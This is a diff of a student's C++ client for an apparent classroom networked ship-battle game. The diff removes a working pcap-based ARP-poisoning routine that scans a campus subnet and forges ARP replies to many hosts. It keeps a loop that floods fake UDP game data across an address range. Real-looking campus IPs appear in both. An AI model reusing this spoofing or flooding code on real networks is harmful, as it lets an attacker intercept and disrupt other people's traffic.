@@ -13,7 +13,7 @@
 #include <algorithm>
 
 // ARP Spoofing links
-#include "pcap.h"
+//#include "pcap.h"
 #include "ether.h"
 #include "arp.h"
 #include "arp_helper.h"
@@ -28,10 +28,10 @@
 #define STUDENT_FIRSTNAME	"Anthony"
 #define STUDENT_FAMILYNAME	"Scully"
 
-//#define IP_ADDRESS_SERVER	"127.0.0.1"
-//#define IP_ADDRESS_SERVER "164.11.80.70"
 //
-#define IP_ADDRESS_SERVER "164.11.80.55"
+#define IP_ADDRESS_SERVER	"127.0.0.1"
+//#define IP_ADDRESS_SERVER "164.11.80.70"
+//#define IP_ADDRESS_SERVER "164.11.80.55"
 
 #define PORT_SEND	 1924 // We define a port that we are going to use.
 #define PORT_RECEIVE 1925 // We define a port that we are going to use.
@@ -51,9 +51,9 @@
 #define MAX_ALLY_DIST	400
 #define MAX_LOCATIONS	8
 #define MAX_ALLIES		3
-#define JOSH_IP			"164.11.80.99"
-#define BRYAN_IP		"164.11.166.51"
-#define DOM_IP			"164.11.80.79"
+//#define JOSH_IP			"164.11.80.99"
+//#define BRYAN_IP		"164.11.166.51"
+//#define DOM_IP			"164.11.80.79"
 
 #define FLAG_HIDE		21
 #define HUNTER_DISTANCE	22500
@@ -73,6 +73,10 @@ const int outerDifference = 200, innerDifference = 300; // Defines how far away 
 const int outerLower = outerDifference, outerUpper = 1000 - outerDifference; 
 const int innerLower = innerDifference, innerHigher = 1000 - innerDifference;
 const int centreOfMap = 500;
+const char JOSH_IP[50]="";
+const char BRYAN_IP[50]="";
+const char DOM_IP[50]="";
+
 
 SOCKADDR_IN sendto_addr;
 SOCKADDR_IN receive_addr;
@@ -167,245 +171,50 @@ bool sortLowestHealth(ShipDetails lhs, ShipDetails rhs){ return lhs.health < rhs
 bool sortClosestShip(ShipDetails lhs, ShipDetails rhs) { return lhs.distance < rhs.distance; }
 bool sortIsAlly(ShipDetails lhs, ShipDetails rhs) { return lhs.isAlly < rhs.isAlly; }
 
-struct arpData
-{
-	u_long ip;
-	u_char mac[ETH_ALEN];
-	u_char arpReply[sizeof(struct ethhdr) + sizeof(arphdr_ether)];
-	u_char arpReplyServer[sizeof(struct ethhdr) + sizeof(arphdr_ether)];
-	u_char arp_packet_client[sizeof(struct ethhdr) + sizeof(arphdr_ether)];
-	u_char arp_packet_server[sizeof(struct ethhdr) + sizeof(arphdr_ether)];
-};
+void leaderSetup(){
+	char buffer[MAX_BUFFER_SIZE];
+	int  len = sizeof(SOCKADDR);
+	char chr, *p;
+	int ally1,ally2,ally3;
 
-void arpSendData(pcap_t *cap_dev, u_char  arpData[sizeof(struct ethhdr) + sizeof(arphdr_ether)])
-{
 	while (true)
 	{
-		pcap_sendpacket(cap_dev, arpData, sizeof(arpData));
-		Sleep(POISON_INTERVAL_MS);
-	}
-}
-
-// Redundant Code
-int arpSpoof()
-{
-	pcap_if_t *alldevs;
-	pcap_if_t *dev;
-	pcap_t *cap_dev;
-	char errbuf[PCAP_ERRBUF_SIZE + 1];
-	u_char if_mac[ETH_ALEN], victim1_mac[ETH_ALEN], victim2_mac[ETH_ALEN];
-	u_long our_ip;
-	u_char arp_reply_victim1[sizeof(struct ethhdr) + sizeof(arphdr_ether)];
-	u_char arp_reply_victim2[sizeof(struct ethhdr) + sizeof(arphdr_ether)];
-
-	/* Retrieve the device list */
-	if(pcap_findalldevs(&alldevs, errbuf) == -1)
-	{
-		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
-		return -1;
-	}
-	int deviceNumber = 0;
-	/* Scan the list for a suitable device to capture/send from */
-	for(dev = alldevs; dev != NULL; dev = dev->next)
-	{
-		deviceNumber++;
-		//printf("%d: %s\n",++deviceNumber, dev->name);
-		//printf("\tDescrition: %s\n",dev->description);
-		pcap_addr_t *dev_addr;
-
-		if ((dev_addr = dev->addresses) != NULL && dev_addr->addr->sa_family == AF_INET && dev_addr->addr && dev_addr->netmask) {
-			printf("Found device %s on address %s with netmask %s\n", dev->name, iptos(((struct sockaddr_in *)dev_addr->addr)->sin_addr.s_addr), iptos(((struct sockaddr_in *)dev_addr->netmask)->sin_addr.s_addr));
-			break;
-		}
-	}
-	
-	// Allows the user choose what device they want
-	int userChoice = 1;//deviceNumber + 1;
-	/*while (userChoice > deviceNumber)
-	{
-		printf("Choose device: ");
-		std::cin >> userChoice;
-		if (userChoice > deviceNumber || userChoice <=0) 
-			printf("Incorrect number, please try again\n");
-	}*/
-	
-	dev = alldevs;
-
-	// Loop through the devices based on the user choice
-	for (int i = 1; i < userChoice; i++) dev->next;
-	printf("\tUsing Descrition: %s\n",dev->description);
-	/* Couldn't find a device? */
-	if (dev == NULL) {
-		printf("Couldn't find a suitable device.\n");
-		/* Free the device list */
-		pcap_freealldevs(alldevs);
-		return 1;
-	}
-
-	/* Get the MAC address for the specific device we're going to use */
-	get_if_mac(dev->name, if_mac);
-
-	/* Open the device for capturing */
-	if ((cap_dev = pcap_open(dev->name, CAP_SNAPLEN, PCAP_OPENFLAG_PROMISCUOUS, CAP_TIMEOUT_MS, NULL, errbuf)) == NULL) {
-		fprintf(stderr, "Couldn't open device for capturing: %s\n", errbuf);
-		pcap_freealldevs(alldevs);
-		return -2;
-	}
-
-	/* Save the IP address we're sending from */
-	our_ip = ((struct sockaddr_in *)dev->addresses->addr)->sin_addr.s_addr;
-
-	/* We can now free the device list */
-	pcap_freealldevs(alldevs);
-
-
-	/* Get the MAC address of victim #2 */
-	printf("Obtaining Victim #2's IP and MAC address\n");
-	//if (get_remote_mac(cap_dev, if_mac, ((struct sockaddr_in *)dev->addresses->addr)->sin_addr.s_addr, VICTIM2_IP, victim2_mac) != 0) {
-	//	fprintf(stderr, "Couldn't find MAC address of %s\n", iptos(VICTIM2_IP));
-	//	pcap_close(cap_dev);
-	//	getchar();
-	//	return -3;
-	//}
-	if (get_remote_mac(cap_dev, if_mac, our_ip, VICTIM2_IP, victim2_mac) != 0) {
-		fprintf(stderr, "Couldn't find MAC address of %s\n", iptos(VICTIM2_IP));
-		pcap_close(cap_dev);
-		return -3;
-	}
-
-	arpData spoofData[255];
-	int ipCount = 0;
-	u_long tempIP = 0;
-	u_char tempMac[6];
-
-	for (int i = 0; i <= 100; i++)
-	{
-		printf("%d\n",i);
-		if (i != 55 && i <= 100)
-		{		
-			tempIP = (164 + (11 << 8) + (80 << 16) + (i << 24));
-			if (get_remote_mac(cap_dev, if_mac, our_ip, tempIP, tempMac) == 0)
-			{
-				spoofData[ipCount].ip = tempIP;
-				strcpy((char*)spoofData[ipCount].mac,(char*)tempMac);
-				ipCount++;
-				printf("%s,%s\n",iptos(tempIP), mactos(tempMac));
+		p = ::inet_ntoa(receive_addr.sin_addr);
+		if (recvfrom(sock_recv, buffer, sizeof(buffer)-1, 0, (SOCKADDR *)&receive_addr, &len) != SOCKET_ERROR)
+		{
+			if (sscanf_s(buffer,"1 %d", ally1) == 4){
+				//allyAddrArray[0].sin_addr.s_addr = inet_ntoa(receive_addr.sin_addr);
+				allyAddrArray[0].sin_addr.s_addr = receive_addr.sin_addr.s_addr;
 			}
-			//else printf("Failed\n");
-		}
-		/*if (i >= 100 && i <= 200)
-		{
-			tempIP = (164 + (11 << 8) + (166 << 16) + (i << 24));
-			if (get_remote_mac(cap_dev, if_mac, our_ip, tempIP, tempMac) == 0)
-			{
-				spoofData[ipCount].ip = tempIP;
-				strcpy((char*)spoofData[ipCount].mac,(char*)tempMac);
-				ipCount++;
-				printf("%s,%s\n",iptos(tempIP), mactos(tempMac));
+			if (sscanf_s(buffer,"2 %d", ally2) == 4){
+				allyAddrArray[1].sin_addr.s_addr = receive_addr.sin_addr.s_addr;
 			}
-		}*/
-	}
-
-
-	printf("All ips checked\n");
-	printf("Valid IP count %d\n", ipCount);
-
-	/* Get the MAC address of victim #1 */
-	//printf("Obtaining Victim #1's IP and MAC address\n");
-	//if (get_remote_mac(cap_dev, if_mac, our_ip, VICTIM1_IP, victim1_mac) != 0) {
-	//	fprintf(stderr, "Couldn't find MAC address of %s\n", iptos(VICTIM1_IP));
-	//	pcap_close(cap_dev);
-	//	return -3;
-	//}
-	//printf("\nVictim #1: (IP, MAC) = (%s, %s)\n", iptos(VICTIM1_IP), mactos(victim1_mac));
-
-	
-	//printf("Victim #2: (IP, MAC) = (%s, %s)\n", iptos(VICTIM2_IP), mactos(victim2_mac));
-
-	//printf("\nPoisoning from (%s, %s)\n", iptos(our_ip), mactos(if_mac));
-	
-
-	
-
-	printf("Starting ARP Poisoning - press 'q' to quit.\n");
-	/* Start ARP poisoning (kernel should be configured to forward IP packets) */
-	for (int i = 0; i < ipCount; i++)
-	{
-		generate_arp_reply(spoofData[i].arpReply, if_mac, spoofData[i].mac, VICTIM2_IP, spoofData[i].ip);
-		generate_arp_reply(spoofData[i].arpReplyServer, if_mac, victim2_mac, spoofData[i].ip, VICTIM2_IP);
-		generate_arp_request(spoofData[i].arp_packet_client, victim2_mac, VICTIM2_IP, spoofData[i].ip); // Generate a fake packet of data. Final arg is destination IP
-		generate_arp_request(spoofData[i].arp_packet_server, victim2_mac, VICTIM2_IP, spoofData[i].ip); // Generate a fake packet of data. Final arg is destination IP
-
-	}
-	//generate_arp_reply(arp_reply_victim1, if_mac, victim1_mac, VICTIM2_IP, VICTIM1_IP);
-	//generate_arp_reply(arp_reply_victim2, if_mac, victim2_mac, VICTIM1_IP, VICTIM2_IP);
-	bool checkAccess = true;
-	while (true) {
-		
-		int quit = 0;
-		
-		while (_kbhit())
-			if (tolower(_getch()) == 'q')
-				quit = 1;
-		if (quit)
-			break;
-
-		/*for (int i = 0; i < ipCount; i++)
-		{
-			tArray[i] = std::thread(arpSendData,cap_dev, spoofData[i].arpReplyServer);
-			tArray[i].detach();
-		}*/
-
-		for (int i = 0; i < ipCount; i++)
-		{
-			//pcap_sendpacket(cap_dev, spoofData[i].arpReply, sizeof(spoofData[i].arpReply)); // Blank this to keep moving
-			//printf("%d Sending \t", i);
-			pcap_sendpacket(cap_dev, spoofData[i].arpReplyServer, sizeof(spoofData[i].arpReplyServer));
-			//printf("Sent\n");
+			if (sscanf_s(buffer,"3 %d", ally3) == 4){
+				allyAddrArray[2].sin_addr.s_addr = receive_addr.sin_addr.s_addr;
+			}
 		}
-		
-		//pcap_sendpacket(cap_dev, arp_reply_victim1, sizeof(arp_reply_victim1));
-		//pcap_sendpacket(cap_dev, arp_reply_victim2, sizeof(arp_reply_victim2));
-		/* Don't overload the network */
-		Sleep(POISON_INTERVAL_MS);
-	}
 
-	printf("\nShutting down...\n");
-	/* Shutting down - unpoison the victims (best-effort) */
-	for (int i = 0; i < ipCount; i++)
-	{
-		generate_arp_reply(spoofData[i].arpReply, if_mac, spoofData[i].mac, VICTIM2_IP, spoofData[i].ip);
-		generate_arp_reply(spoofData[i].arpReplyServer, if_mac, victim2_mac, spoofData[i].ip, VICTIM2_IP);
-	}
-	
-	//generate_arp_reply(arp_reply_victim1, victim2_mac, victim1_mac, VICTIM2_IP, VICTIM1_IP);
-	//generate_arp_reply(arp_reply_victim2, victim1_mac, victim2_mac, VICTIM1_IP, VICTIM2_IP);
-	for (int idx = 0; idx < UNPOISON_RETRIES; idx++) {
-		
-		for (int i = 0; i < ipCount; i++)
+		// If all allies send info, then time to exit and begin combat. One last message is sent to tell them to begin combat.
+		if (ally1 !=0 && ally2 !=0 && ally3 !=0)
 		{
-			pcap_sendpacket(cap_dev, spoofData[i].arpReply, sizeof(spoofData[i].arpReply));
-			pcap_sendpacket(cap_dev, spoofData[i].arpReplyServer, sizeof(spoofData[i].arpReplyServer));
+
 		}
-		//pcap_sendpacket(cap_dev, arp_reply_victim1, sizeof(arp_reply_victim1));
-		//pcap_sendpacket(cap_dev, arp_reply_victim2, sizeof(arp_reply_victim2));
 	}
-
-	pcap_close(cap_dev);
-
-	return 0;
 }
 
 // Creates all the address data for communicating with allies.
 void setupAllyAddressData()
 {
+
+	
 	for (int i = 0; i < MAX_ALLIES; i++)
 	{
 		memset(&allyAddrArray[i], 0, sizeof(SOCKADDR_IN));
 		allyAddrArray[i].sin_family = AF_INET;
-		allyAddrArray[i].sin_addr.s_addr = inet_addr(allyIPArray[i].c_str());
+		//allyAddrArray[i].sin_addr.s_addr = inet_addr(allyIPArray[i].c_str());
 		allyAddrArray[i].sin_port = htons(PORT_RECEIVE);
 	}
+	leaderSetup();
 }
 
 //  Encrypts my flag based on my x and y location.
@@ -425,7 +234,7 @@ bool isAlly(int shipFlag, int shipX, int shipY)
 	shipFlag = shipFlag ^ FLAG_HIDE;
 	rightSide  = shipFlag & 0xFFFF;
 	leftSide  = (shipFlag >> 16) & 0xFFFF;
-	
+
 	int differenceX = abs(leftSide-shipX);
 	int differenceY = abs(rightSide-shipY);
 	if (differenceX < allowance && differenceY < allowance)
@@ -446,7 +255,7 @@ void spamData()
 	if (WSAStartup(MAKEWORD(2, 2), &data) != 0);
 
 	if ((mySocket = socket(AF_INET,SOCK_DGRAM,0)) == SOCKET_ERROR) perror("cannot create socket");
-	
+
 	memset((char *) &myAddr, 0, sizeof(myAddr));
 	myAddr.sin_family = AF_INET;
 	myAddr.sin_addr.s_addr = htonl(INADDR_ANY);
@@ -462,9 +271,9 @@ void spamData()
 
 	while (true)
 	{
-		
+
 		int quit = 0;
-		
+
 		while (_kbhit())
 			if (tolower(_getch()) == 'q')
 				quit = 1;
@@ -503,26 +312,26 @@ void spamData()
 		{
 			//if (i !=46)
 			//{
-				std::string val = "164.11.166." + std::to_string(i);
+			std::string val = "164.11.166." + std::to_string(i);
 
+			hp = gethostbyname(val.c_str());
+			if (!hp) fprintf(stderr, "could not obtain address of %d\n",i);
+
+			printf("Spamming Data on 166\n");
+			memcpy((void*)&servAddr.sin_addr,hp->h_addr_list[0],hp->h_length);
+			if (sendto(sock_send,fakeData,strlen(fakeData),0,(struct sockaddr *)&servAddr,sizeof(servAddr)) < 0) perror("sendto failed");
+			if (val != allyIPArray[0] && val != allyIPArray[1] && val != allyIPArray[2])
+			{
 				hp = gethostbyname(val.c_str());
-				if (!hp) fprintf(stderr, "could not obtain address of %d\n",i);
-
-				printf("Spamming Data on 166\n");
+				if (!hp) fprintf(stderr, "could not obtain address of %s\n",val.c_str());
 				memcpy((void*)&servAddr.sin_addr,hp->h_addr_list[0],hp->h_length);
-				if (sendto(sock_send,fakeData,strlen(fakeData),0,(struct sockaddr *)&servAddr,sizeof(servAddr)) < 0) perror("sendto failed");
-				if (val != allyIPArray[0] && val != allyIPArray[1] && val != allyIPArray[2])
-				{
-					hp = gethostbyname(val.c_str());
-					if (!hp) fprintf(stderr, "could not obtain address of %s\n",val.c_str());
-					memcpy((void*)&servAddr.sin_addr,hp->h_addr_list[0],hp->h_length);
-					if (sendto(mySocket,fakeData,strlen(fakeData),0,(struct sockaddr *)&servAddr,sizeof(servAddr)) < 0) perror("sendto failed");
-				}
+				if (sendto(mySocket,fakeData,strlen(fakeData),0,(struct sockaddr *)&servAddr,sizeof(servAddr)) < 0) perror("sendto failed");
+			}
 
 			//}
 		}
 
-		
+
 		Sleep(100); // 1000 = 1 second
 	}
 
@@ -581,7 +390,7 @@ void moveToLocation(int x, int y)
 	// Allows me to move in a straight line without staggering.
 	if (abs(differenceY) == 1) moveSpeedY = MOVE_SLOW;
 	if (abs(differenceX) == 1) moveSpeedX = MOVE_SLOW;
-	
+
 	if (differenceY > 0) up_down = MOVE_DOWN*moveSpeedY;
 	else if (differenceY < 0) up_down = MOVE_UP*moveSpeedY;
 	else up_down = 0;
@@ -615,7 +424,7 @@ void setNextLocation(bool respawn)
 		for (int i = 0; i < MAX_LOCATIONS; i++)
 		{
 			distance = getDistance(myX,myY,movementLocations[i].x,movementLocations[i].y); // Replace with your own get distance method
-			
+
 			if (respawn)
 			{
 				if (distance < lowestDistance)
@@ -721,7 +530,7 @@ int getEnemyCount()
 	for (int i = 0; i < number_of_ships; i++)
 		if (shipStructArray[i].isAlly == false && (shipStructArray[i].distance < COMBAT_DISTANCE || friendCount != 0))
 			counter++;
-	
+
 	return counter;
 }
 
@@ -752,7 +561,7 @@ void tactics()
 	}
 
 	// Handles movement
-	
+
 	if (closestFriend == MAX_ALLIES) // Movement when grouped with allies
 	{
 		if (enemyCount == 0)
@@ -764,7 +573,7 @@ void tactics()
 	}// Movement when no completely grouped
 	else
 	{
-		 //Attack an enemy alone if certain criteria is met
+		//Attack an enemy alone if certain criteria is met
 		if (shipStructArray[0].health < myHealth && shipStructArray[0].distance < HUNTER_DISTANCE && enemyCount != 0 && friendCount == 0)
 			moveToLocation(allianceX,allianceY);
 		else
@@ -790,7 +599,7 @@ void getUserInput()
 		std::cin >> userCommand;
 		if (userCommand.compare(ARP_ATTACK_STOP_MESSAGE) == 0)
 		{			
-			int successCheck = arpSpoof();
+			int successCheck = 1; //arpSpoof();
 			if (successCheck == 0) printf("Attack completed succuesfully.\n");
 			else printf("Attack failed. Error code: %d\n", successCheck);
 		}
@@ -812,10 +621,10 @@ void communicate_with_server()
 	int  i;
 	int  j;
 	int  rc;
-	
+
 	sprintf_s(buffer, "Register  %s,%s,%s", STUDENT_NUMBER, STUDENT_FIRSTNAME, STUDENT_FAMILYNAME);
 	sendto(sock_send, buffer, strlen(buffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
-	
+
 	//std::thread t1(getUserInput);
 	//t1.detach();
 
@@ -835,7 +644,6 @@ void communicate_with_server()
 					allyShipArray[dom].distance = getDistance(myX,myY,allyShipArray[dom].x,allyShipArray[dom].y);
 				else
 				{
-					printf("Recieved Data!!!!!\n");
 					i = 0;
 					j = 0;
 					finished = false;
@@ -859,7 +667,7 @@ void communicate_with_server()
 							number_of_ships++;
 							finished = true;
 							break;
-					
+
 						default:
 							InputBuffer[j] = chr;
 							j++;
@@ -888,7 +696,7 @@ void communicate_with_server()
 						rc = sendto(sock_send, buffer, strlen(buffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));
 						moveShip = false;
 					}
-		
+
 					if (setFlag)
 					{
 						sprintf_s(buffer, "Flag %s,%d", STUDENT_NUMBER, new_flag);
@@ -915,9 +723,9 @@ void communicate_with_server()
 
 void fire_at_ship(int X, int Y)
 {		
-		fire = true;
-		fireX = X;
-		fireY = Y;
+	fire = true;
+	fireX = X;
+	fireY = Y;
 }
 
 void move_in_direction(int X, int Y)
@@ -954,7 +762,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	sock_recv = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  // Here we create our socket, which will be a UDP socket (SOCK_DGRAM).
 	if (!sock_recv) printf("Socket creation failed!\n"); 
-	
+
 	memset(&sendto_addr, 0, sizeof(SOCKADDR_IN));
 	sendto_addr.sin_family = AF_INET;
 	sendto_addr.sin_addr.s_addr = inet_addr(IP_ADDRESS_SERVER);
@@ -977,7 +785,6 @@ int _tmain(int argc, _TCHAR* argv[])
 	if (ret) printf("Bind failed! %d\n", WSAGetLastError());  
 
 	communicate_with_server();
-	
 
 	closesocket(sock_send);
 	closesocket(sock_recv);
